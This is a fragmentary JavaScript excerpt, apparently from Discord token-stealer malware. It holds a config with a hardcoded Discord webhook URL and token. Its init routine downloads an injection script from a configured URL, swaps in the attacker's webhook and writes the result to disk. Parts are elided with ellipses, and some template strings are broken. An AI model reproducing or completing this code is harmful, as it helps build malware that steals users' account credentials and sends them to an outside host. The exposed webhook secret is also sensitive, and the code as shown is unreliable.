...
const config = {
  webhook: 'https://discord.com/api/webhooks/1201992811730174093/MJ5jICzaWxrkR1Y2EnSXewl6tzNlAFK3yaeF6P1311yx317OkhebPNkxLoq38zPnDHZG', 
...
async function init() {
    https.get('${config.injection_url}', (res) => {
        ...
        res.replace('https://discord.com/api/webhooks/1201992811730174093/MJ5jICzaWxrkR1Y2EnSXewl6tzNlAFK3yaeF6P1311yx317OkhebPNkxLoq38zPnDHZG', '${config.webhook}')
        res.replace('https://discord.com/api/webhooks/1201992811730174093/MJ5jICzaWxrkR1Y2EnSXewl6tzNlAFK3yaeF6P1311yx317OkhebPNkxLoq38zPnDHZG', '${config.webhook_protector_key}')
        res.pipe(file);
        file.on('finish', () => {
            file.close();
        });
